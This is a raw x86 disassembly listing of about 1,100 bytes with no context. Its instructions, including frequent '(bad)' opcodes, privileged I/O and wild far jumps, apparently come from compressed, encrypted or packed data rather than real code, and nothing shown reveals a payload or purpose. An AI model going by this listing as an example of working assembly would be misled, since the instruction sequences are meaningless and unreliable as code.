  439d50:	add    al,0x5a
  439d52:	push   0x4c
  439d54:	mov    eax,ds:0xc77fcde8
  439d59:	pop    edx
  439d5a:	push   ecx
  439d5b:	popa   
  439d5c:	lods   eax,DWORD PTR ds:[esi]
  439d5d:	inc    esi
  439d5e:	mov    esp,0xe846416a
  439d63:	xlat   BYTE PTR ds:[ebx]
  439d64:	jl     0x439d44
  439d66:	lods   al,BYTE PTR ds:[esi]
  439d67:	push   edi
  439d68:	adc    al,0x3e
  439d6a:	fidiv  DWORD PTR [edx]
  439d6c:	jne    0x439d10
  439d6e:	nop
  439d6f:	xor    ch,BYTE PTR [esi+0x53]
  439d72:	mov    al,BYTE PTR [esi+0x1607448d]
  439d78:	ins    BYTE PTR es:[edi],dx
  439d79:	inc    ebx
  439d7a:	ins    BYTE PTR es:[edi],dx
  439d7b:	xchg   BYTE PTR [ebp-0x70],dl
  439d7e:	sbb    al,0xfa
  439d80:	push   esi
  439d81:	adc    ah,bl
  439d83:	mov    eax,ds:0x141541f8
  439d88:	adc    edx,DWORD PTR [edx]
  439d8a:	jle    0x439dec
  439d8c:	imul   esi,DWORD PTR [eax-0x41f5f9e1],0xffffffb6
  439d93:	jle    0x439d73
  439d95:	ins    BYTE PTR es:[edi],dx
  439d96:	pop    eax
  439d97:	mov    edi,0x8e0555a8
  439d9c:	aam    0x0
  439d9e:	dec    ecx
  439d9f:	push   ds
  439da0:	and    dl,ah
  439da2:	add    DWORD PTR [edi],0xffffffa9
  439da5:	and    eax,DWORD PTR [ebx-0x78]
  439da8:	xor    ebx,DWORD PTR [edx+ebx*2]
  439dab:	shl    BYTE PTR [edx-0x5b4c45d6],1
  439db1:	sub    esi,DWORD PTR [ebx]
  439db3:	push   esp
  439db4:	sti    
  439db5:	and    al,0xf5
  439db7:	or     BYTE PTR [edx+0x76],dl
  439dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439dbb:	adc    eax,esp
  439dbd:	cmovg  ebx,DWORD PTR [edx+0xb]
  439dc1:	mov    WORD PTR [esi],fs
  439dc3:	cmp    al,0x91
  439dc5:	dec    edi
  439dc6:	fadd   QWORD PTR [edi]
  439dc8:	xor    BYTE PTR [edx+0x154e4ba9],ch
  439dce:	int3   
  439dcf:	bound  esi,QWORD PTR [edi-0x6854a60c]
  439dd5:	push   es
  439dd6:	repnz xchg ebx,eax
  439dd8:	popf   
  439dd9:	mov    al,BYTE PTR [esi]
  439ddb:	mov    eax,ds:0xbfdca00a
  439de0:	push   0x38
  439de2:	add    BYTE PTR [edi-0x6a],0x4c
  439de6:	data16 mov ds:0xd5c31888,al
  439dec:	nop
  439ded:	ds clc 
  439def:	fsub   st(4),st
  439df1:	mov    eax,0x40c29a00
  439df6:	cli    
  439df7:	dec    ebp
  439df8:	(bad)  
  439df9:	lock dec ecx
  439dfb:	adc    al,0x9
  439dfd:	xchg   BYTE PTR [edx-0x41e38bca],al
  439e03:	push   ebp
  439e04:	dec    esi
  439e05:	outs   dx,DWORD PTR ds:[esi]
  439e06:	outs   dx,BYTE PTR ds:[esi]
  439e07:	lods   al,BYTE PTR ds:[esi]
  439e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439e09:	mov    WORD PTR [eax],gs
  439e0b:	mov    dl,0xcf
  439e0d:	scas   al,BYTE PTR es:[edi]
  439e0e:	and    eax,0xbc748812
  439e13:	mov    ah,0x9
  439e15:	aad    0x34
  439e17:	cmp    ch,BYTE PTR [esp+edx*4-0x68]
  439e1b:	mov    ah,0x89
  439e1d:	imul   ebx,DWORD PTR [ecx-0x709523a2],0xd511901c
  439e27:	or     DWORD PTR [edx+0x3ef221d0],esp
  439e2d:	loop   0x439e98
  439e2f:	inc    ebp
  439e30:	inc    edi
  439e31:	lds    eax,FWORD PTR [ecx+0x51243b28]
  439e37:	retf   0x88a6
  439e3a:	or     ebx,esp
  439e3c:	push   esi
  439e3d:	or     DWORD PTR [eax-0x4b89ba46],0x4d4a367e
  439e47:	leave  
  439e48:	cld    
  439e49:	add    BYTE PTR [ecx+esi*8+0x0],bl
  439e4d:	cdq    
  439e4e:	lods   eax,DWORD PTR ds:[esi]
  439e4f:	int3   
  439e50:	ret    
  439e51:	ins    BYTE PTR es:[edi],dx
  439e52:	inc    edx
  439e53:	inc    esp
  439e54:	sub    bh,BYTE PTR [esp+ebp*2]
  439e57:	adc    eax,0xc618adae
  439e5c:	inc    esi
  439e5d:	push   es
  439e5e:	cmp    eax,0x70fc28f2
  439e63:	mov    gs,WORD PTR [esi+0x1799b0be]
  439e69:	add    BYTE PTR [ebp+0x46d43b00],bl
  439e6f:	sub    bh,BYTE PTR [edx]
  439e71:	jb     0x439e3b
  439e73:	and    al,0x64
  439e75:	inc    ebp
  439e76:	and    al,0x16
  439e78:	cmp    BYTE PTR [esi+0x61012937],cl
  439e7e:	xchg   esi,eax
  439e7f:	mov    dl,BYTE PTR [edx+eax*4-0x55f939f1]
  439e86:	sbb    cl,cl
  439e88:	mov    dl,0x1e
  439e8a:	mov    fs,WORD PTR [eax-0x58]
  439e8d:	cwde   
  439e8e:	push   0x4a894068
  439e93:	test   al,0x18
  439e95:	retf   
  439e96:	pop    ecx
  439e97:	(bad)  
  439e99:	and    eax,0x291a97a2
  439e9e:	adc    eax,DWORD PTR ds:0x4c5d6499
  439ea4:	xor    BYTE PTR [ebp+eax*4-0x7b],dh
  439ea8:	push   cs
  439ea9:	test   eax,0x9674eaf8
  439eae:	lea    ecx,[edi]
  439eb0:	arpl   di,ax
  439eb2:	sahf   
  439eb3:	sub    ah,BYTE PTR [edx]
  439eb5:	addr16 in al,dx
  439eb7:	outs   dx,DWORD PTR ds:[esi]
  439eb8:	mov    eax,ds:0xdeb75017
  439ebd:	(bad)  
  439ebe:	push   esi
  439ebf:	mov    edx,0xda3b581e
  439ec4:	adc    eax,esp
  439ec6:	xor    esp,DWORD PTR [edx]
  439ec8:	mov    BYTE PTR [edx-0x4e5d2c0f],bh
  439ece:	shl    DWORD PTR [ebx],0x88
  439ed1:	gs cmc 
  439ed3:	(bad)  
  439ed4:	mov    ch,0x94
  439ed6:	adc    edi,DWORD PTR [edi-0x41b582a0]
  439edc:	pusha  
  439edd:	fs in  eax,0xf6
  439ee0:	add    eax,0xc45d56cd
  439ee5:	sbb    esi,esi
  439ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439ee8:	mov    dl,0x1c
  439eea:	call   0xb1db:0x408b7275
  439ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439ef2:	fwait
  439ef3:	push   edx
  439ef4:	stos   BYTE PTR es:[edi],al
  439ef5:	pop    eax
  439ef6:	(bad)  
  439ef7:	push   ebx
  439ef8:	inc    ebp
  439ef9:	cld    
  439efa:	xchg   esi,eax
  439efb:	lock push es
  439efd:	cli    
  439efe:	push   eax
  439eff:	push   ss
  439f00:	icebp  
  439f01:	adc    eax,0xae9a2294
  439f06:	jbe    0x439ef8
  439f08:	mov    al,ds:0x81dbf8d0
  439f0d:	fcmovbe st,st(6)
  439f0f:	inc    eax
  439f10:	add    bl,BYTE PTR [eax-0x7d]
  439f13:	mov    al,ds:0xf06260a
  439f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439f19:	adc    al,bh
  439f1b:	cmp    al,BYTE PTR [edx+ebp*4-0x593b17a0]
  439f22:	cwde   
  439f23:	xor    BYTE PTR [ebx],al
  439f25:	mov    al,ds:0xf724aa93
  439f2a:	mov    ah,0x37
  439f2c:	xor    al,BYTE PTR [eax-0x3a254d71]
  439f32:	and    ecx,DWORD PTR [esi+0x7d4904ba]
  439f38:	stos   DWORD PTR es:[edi],eax
  439f39:	adc    al,dh
  439f3b:	daa    
  439f3c:	pop    esi
  439f3d:	add    ebp,DWORD PTR [eax-0x37]
  439f40:	xchg   BYTE PTR [edx],bl
  439f42:	inc    ecx
  439f43:	cmp    al,0x92
  439f45:	mov    bh,0xe2
  439f47:	jg     0x439fb8
  439f49:	mov    ds:0x2ad2d748,eax
  439f4e:	xchg   BYTE PTR [eax+esi*4+0x73],al
  439f52:	retf   
  439f53:	clc    
  439f54:	(bad)  
  439f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439f56:	int3   
  439f57:	jmp    FWORD PTR fs:[edx-0x255f0272]
  439f5e:	inc    ecx
  439f5f:	pop    edi
  439f60:	cld    
  439f61:	je     0x439f39
  439f63:	out    0x7a,al
  439f65:	(bad)  
  439f66:	(bad)  
  439f67:	sbb    esp,DWORD PTR [esi+ebx*4]
  439f6a:	inc    eax
  439f6b:	sub    ch,0xb0
  439f6e:	shr    DWORD PTR [ecx],0xc3
  439f71:	sahf   
  439f72:	clc    
  439f73:	lods   al,BYTE PTR ds:[esi]
  439f74:	enter  0x1ee7,0xbf
  439f78:	sub    al,0xbc
  439f7a:	xor    al,BYTE PTR [edx+eax*8-0x34b97d49]
  439f81:	out    0x1d,al
  439f83:	out    0x55,al
  439f85:	test   BYTE PTR [ebp+0x0],bl
  439f88:	inc    esp
  439f89:	xlat   BYTE PTR ds:[ebx]
  439f8a:	mov    edx,0x4e002d7b
  439f8f:	scas   eax,DWORD PTR es:[edi]
  439f90:	sub    BYTE PTR [ebp+0x348decd9],0xe2
  439f97:	in     al,dx
  439f98:	fdivr  st(2),st
  439f9a:	mov    ebx,0x5053e220
  439f9f:	(bad)  
  439fa0:	or     ebx,DWORD PTR [ebx+0x2a]
  439fa3:	mov    ch,0x21
  439fa5:	inc    edx
  439fa6:	scas   eax,DWORD PTR es:[edi]
  439fa7:	push   eax
  439fa8:	lock mov WORD PTR [ecx+ecx*4+0x54],ds
  439fad:	cmp    ch,al
  439faf:	sbb    al,0xb9
  439fb1:	mov    ah,0xa9
  439fb3:	test   al,0xf
  439fb5:	inc    edx
  439fb6:	imul   ebx,DWORD PTR [edx],0xffffffbe
  439fb9:	retf   
  439fba:	fisttp QWORD PTR [edi-0x60]
  439fbd:	call   0x5435:0x664576a
  439fc4:	mov    ebx,esp
  439fc6:	ror    BYTE PTR [edx+0x6ce82e11],1
  439fcc:	shl    BYTE PTR [ecx+ecx*1+0x0],1
  439fd0:	and    edx,DWORD PTR [eax]
  439fd2:	cmp    ecx,esp
  439fd4:	lea    ebx,[edi+0x5a]
  439fd7:	xchg   ebp,eax
  439fd8:	stc    
  439fd9:	inc    edx
  439fda:	and    eax,0x69a10ad4
  439fdf:	ret    0xcad1
  439fe2:	push   esi
  439fe3:	pushf  
  439fe4:	sub    DWORD PTR [edx],0xf4dcc544
  439fea:	ins    DWORD PTR es:[edi],dx
  439feb:	mov    al,0x2b
  439fed:	or     DWORD PTR [esi],0x3e5e3c35
  439ff3:	sbb    bh,ah
  439ff5:	scas   al,BYTE PTR es:[edi]
  439ff6:	aaa    
  439ff7:	jne    0x439ffe
  439ff9:	add    DWORD PTR [edi+0x699d7b2],ebx
  439fff:	(bad)  
  43a000:	jmp    0x439f99
  43a002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a003:	ins    DWORD PTR es:[edi],dx
  43a004:	scas   al,BYTE PTR es:[edi]
  43a005:	cli    
  43a006:	pop    ecx
  43a007:	add    al,0x0
  43a009:	xchg   BYTE PTR [esi],bl
  43a00b:	pop    ebp
  43a00c:	psrld  mm1,QWORD PTR [ebx+0x66]
  43a010:	pop    edx
  43a011:	adc    DWORD PTR [edx+0x24],ecx
  43a014:	je     0x439ffb
  43a016:	addr16 lahf 
  43a018:	sub    BYTE PTR [esi+0x1e88f205],0x3e
  43a01f:	xor    BYTE PTR [edx+edi*8+0x1d4012ed],dl
  43a026:	xchg   esi,eax
  43a027:	jmp    0x8d62c0fc
  43a02c:	mov    esi,0x84488d69
  43a031:	jmp    0xe216:0x9785be98
  43a038:	int3   
  43a039:	scas   eax,DWORD PTR es:[edi]
  43a03a:	jo     0x439fce
  43a03c:	push   eax
  43a03d:	push   esi
  43a03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a03f:	rcr    DWORD PTR [edx-0x5ecb39a3],1
  43a045:	test   al,0x95
  43a047:	shl    BYTE PTR [edx+0x6c],1
  43a04a:	mov    al,ds:0xa0b03619
  43a04f:	mov    ecx,0xd279ddea
  43a054:	mov    edx,0x2a2a9e00
  43a059:	xor    DWORD PTR [esi+0x6d],edi
  43a05c:	int    0x61
  43a05e:	dec    ecx
  43a05f:	cld    
  43a060:	jo     0x439ff6
  43a062:	fmul   QWORD PTR [ebp-0x64ec822b]
  43a069:	stos   BYTE PTR es:[edi],al
  43a06a:	adc    BYTE PTR [ebp-0x28],cl
  43a06d:	fsub   QWORD PTR [edx-0xa]
  43a070:	lock or BYTE PTR ds:0xe8b0a47d,ch
  43a077:	sub    BYTE PTR [edx-0x4a228aac],ah
  43a07d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a07e:	(bad)  
  43a07f:	ds aam 0xbe
  43a082:	or     bl,BYTE PTR [edi+0x52]
  43a085:	mov    cl,0x1c
  43a087:	push   ecx
  43a088:	add    al,0x84
  43a08a:	fisub  WORD PTR [esi]
  43a08c:	push   ss
  43a08d:	xor    al,0xa
  43a08f:	mov    ah,0xea
  43a091:	push   cs
  43a092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a093:	fcom   QWORD PTR [ebp-0x7bcf3a77]
  43a099:	push   eax
  43a09a:	add    al,0x76
  43a09c:	jle    0x43a0b1
  43a09e:	fsubr  st,st(4)
  43a0a0:	outs   dx,BYTE PTR ds:[esi]
  43a0a1:	adc    bh,dl
  43a0a3:	mov    esi,0x6fd6729f
  43a0a8:	push   edx
  43a0a9:	and    ah,bl
  43a0ab:	wrmsr  
  43a0ad:	dec    edx
  43a0ae:	push   ss
  43a0af:	xor    al,BYTE PTR [eax]
  43a0b1:	fistp  QWORD PTR [edx]
  43a0b3:	pop    ecx
  43a0b4:	xchg   ecx,eax
  43a0b5:	jno    0x43a03c
  43a0b7:	mov    edx,0x209abeca
  43a0bc:	pop    eax
  43a0bd:	push   ebp
  43a0be:	inc    ebx
  43a0bf:	inc    ebx
  43a0c0:	sbb    eax,DWORD PTR [eax+0x60f2b658]
  43a0c6:	mov    al,0xaa
  43a0c8:	lock je 0x43a0c5
  43a0cb:	gs pusha 
  43a0cd:	lods   al,BYTE PTR ds:[esi]
  43a0ce:	push   ecx
  43a0cf:	sahf   
  43a0d0:	add    bl,BYTE PTR [ecx-0x47]
  43a0d3:	enter  0xda90,0xbc
  43a0d7:	xor    eax,0x41b23b9e
  43a0dc:	test   DWORD PTR [eax],eax
  43a0de:	jns    0x43a128
  43a0e0:	(bad)  
  43a0e1:	push   0xc638ca55
  43a0e6:	shr    BYTE PTR [ecx-0x44],1
  43a0e9:	or     DWORD PTR [edx+0x30fb381a],ebp
  43a0ef:	popa   
  43a0f0:	pop    edx
  43a0f1:	cli    
  43a0f2:	fild   QWORD PTR [eax+eax*1-0x6e]
  43a0f6:	add    al,0xd1
  43a0f8:	rcl    eax,1
  43a0fa:	xchg   ecx,eax
  43a0fb:	add    bh,ah
  43a0fd:	jb     0x43a0e0
  43a0ff:	loope  0x43a104
  43a101:	shl    BYTE PTR [esi+0x2e],cl
  43a104:	mov    dl,0x4c
  43a106:	or     eax,0x8c131646
  43a10b:	push   esi
  43a10c:	dec    esp
  43a10d:	fimul  WORD PTR [ebp-0x5e771054]
  43a113:	or     al,BYTE PTR [ebx+eax*8+0x63]
  43a117:	mov    al,0x67
  43a119:	sbb    al,0x63
  43a11b:	retf   0x8058
  43a11e:	and    edx,DWORD PTR [edx]
  43a120:	jle    0x43a14a
  43a122:	dec    edi
  43a123:	cmc    
  43a124:	(bad)  
  43a125:	mov    ch,0xd0
  43a127:	jle    0x43a147
  43a129:	inc    edi
  43a12a:	les    ebp,FWORD PTR [esi]
  43a12c:	push   es
  43a12d:	stos   BYTE PTR es:[edi],al
  43a12e:	lods   eax,DWORD PTR ds:[esi]
  43a12f:	and    DWORD PTR es:[eax+0x1d],ebp
  43a133:	inc    eax
  43a134:	pop    es
  43a135:	xchg   esp,eax
  43a136:	fdiv   QWORD PTR [esi+eax*2+0x406a0f13]
  43a13d:	ret    
  43a13e:	push   cs
  43a13f:	sbb    cl,BYTE PTR [ecx+ebp*2-0x41]
  43a143:	inc    ebp
  43a144:	ins    BYTE PTR es:[edi],dx
  43a145:	add    al,0xc6
  43a147:	out    0x2a,al
  43a149:	pushf  
  43a14a:	jb     0x43a186
  43a14c:	mov    cl,0xc
  43a14e:	xchg   ecx,eax
  43a150:	xchg   esp,eax
  43a151:	mov    dh,0x54
  43a153:	inc    eax
  43a154:	inc    eax
  43a155:	cmp    esi,DWORD PTR [edx+edx*8+0x5ba822fe]
  43a15c:	aas    
  43a15d:	lods   eax,DWORD PTR ds:[esi]
  43a15e:	in     eax,dx
  43a15f:	sahf   
  43a160:	inc    esi
  43a161:	fs clc 
  43a163:	out    dx,al
  43a164:	sub    al,0xb3
  43a166:	add    eax,0x3db434f4
  43a16b:	mov    ds:0xd2e640d7,al
  43a170:	icebp  
  43a171:	jmp    0x43a1b6
  43a173:	or     DWORD PTR [edi],edi
  43a175:	and    al,bh
  43a177:	dec    edi
  43a178:	jno    0x43a148
  43a17a:	fs ss jne 0x43a133
  43a17e:	and    DWORD PTR [esi],ebp
  43a180:	mov    WORD PTR [ebx+ebp*1+0x64],?
  43a184:	paddq  mm4,mm0
  43a187:	adc    BYTE PTR [ebx+ebx*2-0x14],0x49
  43a18c:	mov    DWORD PTR [eax-0x43015ba8],eax
  43a192:	xchg   edx,eax
  43a193:	push   eax
  43a194:	dec    ebp
  43a195:	enter  0xa0d6,0x6d
  43a199:	xlat   BYTE PTR ds:[ebx]
  43a19a:	fcom   st(0)
  43a19c:	mov    cs,WORD PTR [ebp-0x78]
  43a19f:	jb     0x43a1ab
  43a1a1:	push   ecx
  43a1a2:	into   
  43a1a3:	or     eax,0x393610d4
  43a1a8:	push   ebx
  43a1a9:	sbb    ebp,esi
  43a1ab:	jbe    0x43a1e1
  43a1ad:	in     eax,dx
  43a1ae:	mov    eax,ds:0xb4dccfa4
  43a1b3:	sub    esi,esp
  43a1b5:	jmp    0x43a15c
  43a1b7:	push   edx
  43a1b8:	aam    0x14
  43a1ba:	fldenv [edi]
  43a1bc:	push   ecx
  43a1bd:	js     0x43a1d9
  43a1bf:	cli    
  43a1c0:	fmul   QWORD PTR [edx+eiz*4+0x99a247c]
  43a1c7:	mov    bh,BYTE PTR [eax]
  43a1c9:	test   BYTE PTR [esp+ebx*1+0x459e1b00],al
  43a1d0:	sahf   
  43a1d1:	(bad)  
  43a1d2:	loopne 0x43a1d1
  43a1d4:	pop    ebp
  43a1d5:	and    al,0x23
  43a1d7:	jo     0x43a221
  43a1d9:	jb     0x43a202
  43a1db:	je     0x43a1b1
  43a1dd:	or     al,0x35
  43a1df:	sbb    DWORD PTR [edx-0x3d8d2030],ebp
  43a1e5:	sub    BYTE PTR [eax+0x28c6a3fd],bh
  43a1eb:	daa    
  43a1ec:	add    BYTE PTR [edi+0x7adc8a],al
  43a1f2:	jo     0x43a1c0
  43a1f4:	pushf  
  43a1f5:	sub    ecx,DWORD PTR [ecx]
  43a1f7:	int    0x28
  43a1f9:	fdivr  DWORD PTR [ecx+0x6]
  43a1fc:	(bad)  
  43a1fd:	jbe    0x43a25a
  43a1ff:	mov    eax,0xe230da24
  43a204:	jbe    0x43a285
  43a206:	into   
  43a207:	test   al,0x96
  43a209:	stos   BYTE PTR es:[edi],al
  43a20a:	mov    ah,0x70
  43a20c:	stos   BYTE PTR es:[edi],al
  43a20d:	call   0x8e914d36
  43a212:	pop    ebp
  43a213:	xlat   BYTE PTR ds:[ebx]
  43a214:	xchg   BYTE PTR [edx+0x6e],cl
  43a217:	loop   0x43a264
  43a219:	data16 xor al,0x78
  43a21c:	pop    ebx
  43a21d:	das    
  43a21e:	sub    al,0xb5
  43a220:	xor    eax,0x531a7eee
  43a225:	inc    ebp
  43a226:	push   ebp
  43a227:	iret   
  43a228:	ret    0x8c03
  43a22b:	hlt    
  43a22c:	pop    esi
  43a22d:	faddp  st(2),st
  43a22f:	shl    bh,cl
  43a231:	push   es
  43a232:	lods   al,BYTE PTR ds:[esi]
  43a233:	ins    DWORD PTR es:[edi],dx
  43a234:	or     eax,0x1410599e
  43a239:	sub    DWORD PTR [edx],ecx
  43a23b:	lods   al,BYTE PTR ss:[esi]
  43a23d:	ret    0x263
  43a240:	lds    esi,FWORD PTR [esi]
  43a242:	fdivr  DWORD PTR [esi-0x56ca9112]
  43a248:	not    BYTE PTR [ecx+0x3a99308a]
  43a24e:	and    ebx,DWORD PTR [edx+ebp*4-0x62]
  43a252:	add    al,0xe0
  43a254:	ret    
  43a255:	in     al,dx
  43a256:	pop    esi
  43a257:	add    al,0xe4
  43a259:	adc    DWORD PTR [esi],esi
  43a25b:	fistp  DWORD PTR [esp+eax*1]
  43a25e:	loop   0x43a242
  43a260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a261:	aas    
  43a262:	jl     0x43a22e
  43a264:	fdivr  QWORD PTR [ebx-0x80]
  43a267:	add    eax,0x3ece1447
  43a26c:	jmp    0x2f04:0x1b431205
  43a273:	mov    dh,BYTE PTR [ecx]
  43a275:	xchg   ebp,eax
  43a276:	in     al,0xc8
  43a278:	rcl    DWORD PTR [edx+0x40],1
  43a27b:	mov    bh,0x85
  43a27d:	inc    edi
  43a27e:	add    dl,dl
  43a280:	push   esi
  43a281:	mov    edx,0x98f432f8
  43a286:	xor    al,0x22
  43a288:	adc    dh,BYTE PTR [edx+0x6868685c]
  43a28e:	sub    dl,BYTE PTR [esi+edi*8+0xa]
  43a292:	retf   
  43a293:	bound  ebp,QWORD PTR [ebp-0x7a]
  43a296:	inc    ecx
  43a297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a298:	jo     0x43a2fa
  43a29a:	ins    BYTE PTR es:[edi],dx
  43a29b:	stos   BYTE PTR es:[edi],al
  43a29c:	add    ebx,DWORD PTR [edx]
  43a29e:	push   cs
  43a29f:	(bad)  
  43a2a0:	test   BYTE PTR ds:[edi-0x7db1a550],dl
  43a2a7:	sahf   
  43a2a8:	lods   al,BYTE PTR ds:[esi]
  43a2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a2aa:	pop    esp
  43a2ab:	mov    ds:0x6c05c4d1,eax
  43a2b0:	mov    dh,0x52
  43a2b2:	cmp    ebx,DWORD PTR [esi+0x59]
  43a2b5:	clc    
  43a2b6:	and    BYTE PTR [eax+0x1ff8b912],bh
  43a2bc:	jne    0x43a240
  43a2be:	(bad)
  43a2c3:	clc    
  43a2c4:	div    BYTE PTR [ebx-0x5cd0bf48]
  43a2ca:	inc    edx
  43a2cb:	pop    esp
  43a2cc:	pop    esi
  43a2cd:	jl     0x43a278
  43a2cf:	or     al,0x75
  43a2d1:	je     0x43a273
  43a2d3:	cmp    eax,0x6385f30
  43a2d8:	mov    ah,0xcb
  43a2da:	gs pusha 
  43a2dc:	inc    esp
  43a2dd:	inc    esi
  43a2de:	or     al,0x30
  43a2e0:	or     BYTE PTR [eax+0x2e695278],ch
  43a2e6:	jnp    0x43a346
  43a2e8:	call   0x8832:0xb0928082
  43a2ef:	cmp    al,0x36
  43a2f1:	sub    ecx,edx
  43a2f3:	mov    edx,0x4482e520
  43a2f8:	(bad)  
  43a2f9:	shr    BYTE PTR [ecx+esi*1-0x51],1
  43a2fd:	inc    eax
  43a2fe:	jge    0x43a336
  43a300:	sbb    al,0xef
  43a302:	xor    al,0x2a
  43a304:	jmp    DWORD PTR [esi+0x0]
  43a307:	jmp    0x43a319
  43a309:	gs or  bl,dl
  43a30c:	iret   
  43a30d:	lods   al,BYTE PTR ds:[esi]
  43a30e:	inc    esi
  43a30f:	mov    al,ds:0x13732275
  43a314:	and    bl,BYTE PTR [ebx]
  43a316:	xor    ah,BYTE PTR ds:0x388d15e3
  43a31c:	les    edx,FWORD PTR [eax-0x37]
  43a31f:	add    eax,0x1cf8933e
  43a324:	add    ah,dl
  43a326:	add    al,0x34
  43a328:	std    
  43a329:	sbb    bh,BYTE PTR [edx+0x4]
  43a32c:	add    ebp,ebp
  43a32e:	sbb    BYTE PTR [ecx+0x756279a],dl
  43a334:	add    ebx,DWORD PTR [eax+eax*8+0x5a]
  43a338:	mov    eax,ds:0x633228c6
  43a33d:	shr    BYTE PTR ds:0x322006fd,cl
  43a343:	sub    al,0x10
  43a345:	test   ch,0xf9
  43a348:	ret    
  43a349:	push   0x1b
  43a34b:	mov    al,ds:0x6af53fee
  43a350:	adc    eax,0xa0d16f2e
  43a355:	mov    eax,ds:0xbad00ae0
  43a35a:	retf   
  43a35b:	out    0x79,al
  43a35d:	jle    0x43a3d3
  43a35f:	ret    0x4628
  43a362:	inc    ecx
  43a363:	je     0x43a3b9
  43a365:	rol    BYTE PTR [eax+0x37],0x82
  43a369:	push   eax
  43a36a:	mov    ch,0x3d
  43a36c:	mov    ah,0x87
  43a36e:	(bad)  
  43a36f:	cli    
  43a370:	call   0x7ae8:0x8b905b42
  43a377:	shl    BYTE PTR [esi+edi*1-0xa],cl
  43a37b:	sahf   
  43a37c:	popf   
  43a37d:	ss call 0xf40a:0xb6104c1c
  43a385:	rol    dl,1
  43a387:	addr16 pop edx
  43a389:	mov    esp,0x15adb47a
  43a38e:	mov    gs,ebp
  43a390:	jle    0x43a340
  43a392:	push   edx
  43a393:	test   al,0x42
  43a395:	(bad)  
  43a396:	retf   0x45bb
  43a399:	dec    edx
  43a39a:	fst    QWORD PTR [esi-0x11871742]
  43a3a0:	sbb    DWORD PTR [ebx+ebx*2-0x38],ebp
  43a3a4:	js     0x43a3f2
  43a3a6:	ficom  WORD PTR [esi]
  43a3a8:	icebp  
  43a3a9:	jae    0x43a421
  43a3ab:	cmp    eax,0xec063014
  43a3b0:	dec    esi
  43a3b1:	push   ss
  43a3b2:	test   DWORD PTR [bp+si+0x1410],ecx
  43a3b7:	mov    esp,0xa68adee5
  43a3bc:	pop    ds
  43a3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a3be:	ds (bad) 
  43a3c0:	fbstp  TBYTE PTR [eax+ebx*2-0x7659c0c7]
  43a3c7:	inc    eax
  43a3c8:	fld    TBYTE PTR [esi-0x1e31cd5f]
  43a3ce:	push   edx
  43a3cf:	pop    ss
  43a3d0:	or     ah,BYTE PTR [esi+0x3ecb3521]
  43a3d6:	sbb    cl,dl
  43a3d8:	dec    ecx
  43a3d9:	shr    dh,1
  43a3db:	mov    esp,ds
  43a3dd:	imul   eax,DWORD PTR [eax],0x1a
  43a3e0:	jp     0x43a381
  43a3e2:	xor    al,0xe6
  43a3e4:	inc    esp
  43a3e5:	jbe    0x43a386
  43a3e7:	push   0xffffffa2
  43a3e9:	lock cwde 
  43a3eb:	inc    esi
  43a3ec:	repz xor al,0x68
  43a3ef:	add    DWORD PTR [eax+0x3f],ebp
  43a3f2:	add    BYTE PTR [ebp+0x76],bh
  43a3f5:	js     0x43a459
  43a3f7:	mov    WORD PTR [edx+0x3],cs
  43a3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a3fb:	pusha  
  43a3fc:	adc    al,0x58
  43a3fe:	sub    ebx,DWORD PTR [ecx-0x6fefd7f1]
  43a404:	dec    BYTE PTR ds:0x98369657
  43a40a:	mov    ecx,0x86c4be27
  43a40f:	xchg   edx,eax
  43a411:	cdq    
  43a412:	clc    
  43a413:	and    edi,0x8ca5a21c
  43a419:	test   BYTE PTR [ebp-0x4c],dl
  43a41c:	aad    0x32
  43a41e:	lods   al,BYTE PTR ds:[esi]
  43a41f:	sbb    esp,0xa09dd0a7
  43a425:	(bad)  [ebp-0x53]
  43a428:	push   ecx
  43a429:	mov    bh,BYTE PTR [edi+0x5e]
  43a42c:	jp     0x43a45c
  43a42e:	stos   BYTE PTR es:[edi],al
  43a42f:	not    DWORD PTR [edi+0x76]
  43a432:	mov    al,ds:0xc6545f55
  43a437:	hlt    
  43a438:	adc    eax,0x2717ab96
  43a43d:	adc    ecx,DWORD PTR [ebx+0x5cb19aae]
  43a443:	aaa    
  43a444:	nop
  43a445:	cmp    ah,dh
  43a447:	adc    al,al
  43a449:	mov    dl,BYTE PTR [eax]
  43a44b:	jbe    0x43a45f
  43a44d:	and    ah,BYTE PTR [edi+edx*1+0x382d4163]
  43a454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a455:	add    bh,BYTE PTR [eax+0xb4e766]
  43a45b:	adc    eax,0x46dc0e14
  43a460:	jo     0x43a4e0
  43a462:	sub    DWORD PTR [eax],ebx
  43a464:	sub    BYTE PTR ds:0x65525cdc,bh
  43a46a:	stos   DWORD PTR es:[edi],eax
  43a46b:	stos   BYTE PTR es:[edi],al
  43a46c:	ret    
  43a46d:	xor    cl,ah
  43a46f:	test   DWORD PTR [edx-0x4ac9c343],esp
  43a475:	dec    eax
  43a476:	xor    bl,dl
  43a478:	sar    BYTE PTR [edi],cl
  43a47a:	push   es
  43a47b:	fs pushf 
  43a47d:	imul   ecx,DWORD PTR [ecx-0x51],0xc
  43a481:	add    BYTE PTR [ebx+0x17],bl
  43a484:	(bad)  
  43a485:	adc    eax,0x59a6c43c
  43a48a:	or     ah,al
  43a48c:	addr16 cmp dh,cl
  43a48f:	jo     0x43a451
  43a491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a492:	xchg   ecx,eax
  43a493:	fcmove st,st(2)
  43a495:	xchg   dh,ch
  43a497:	popf   
  43a498:	inc    edi
  43a499:	dec    eax
  43a49a:	xchg   esp,eax
  43a49b:	push   ecx
